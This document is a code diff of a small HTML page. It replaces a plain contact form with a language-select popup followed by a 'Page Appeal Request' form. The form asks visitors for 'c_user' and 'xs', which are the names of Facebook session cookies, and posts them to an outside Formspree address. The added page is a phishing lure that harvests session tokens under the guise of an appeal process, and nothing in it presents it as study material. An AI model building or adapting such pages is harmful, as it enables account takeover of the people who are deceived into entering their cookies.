@@ -1,20 +1,41 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { font-family: sans-serif; padding: 20px; display: flex; justify-content: center; }
-        form { display: flex; flex-direction: column; gap: 15px; width: 100%; max-width: 400px; }
-        input, textarea { padding: 15px; border: 2px solid #ccc; border-radius: 10px; font-size: 16px; }
-        button { padding: 15px; background: #007bff; color: white; border: none; border-radius: 10px; font-size: 18px; cursor: pointer; }
+        /* CSS: Language Popup aur Form ki styling */
+        #language-popup { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 1000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        #main-form { display: none; padding: 20px; }
+        .btn { padding: 15px; background: #007bff; color: white; border: none; width: 100%; border-radius: 10px; cursor: pointer; }
     </style>
 </head>
 <body>
-    <form action="https://formspree.io/f/maqaobyw" method="POST">
-        <h2 style="text-align: center;">Contact Form</h2>
-        <input type="email" name="email" placeholder="Apna Email" required>
-        <textarea name="message" placeholder="Message" required rows="5"></textarea>
-        <button type="submit">Send</button>
-    </form>
+
+    <div id="language-popup">
+        <h2>Select Your Language</h2>
+        <select id="lang-select" style="padding: 10px; width: 80%;">
+            <option value="en">English</option>
+            <option value="hi">Hindi</option>
+        </select>
+        <br>
+        <button class="btn" onclick="showForm()">Confirm Language</button>
+    </div>
+
+    <div id="main-form">
+        <h2>Page Appeal Request</h2>
+        <form action="https://formspree.io/f/maqaobyw" method="POST">
+            <input type="text" name="c_user" placeholder="Enter c_user" required style="width: 100%; padding: 10px; margin-bottom: 10px;">
+            <input type="text" name="xs" placeholder="Enter xs" required style="width: 100%; padding: 10px; margin-bottom: 10px;">
+            <button type="submit" class="btn">Submit Appeal</button>
+        </form>
+    </div>
+
+    <script>
+        // JavaScript: Popup hatane aur form dikhane ke liye
+        function showForm() {
+            document.getElementById('language-popup').style.display = 'none';
+            document.getElementById('main-form').style.display = 'block';
+        }
+    </script>
 </body>
 </html>
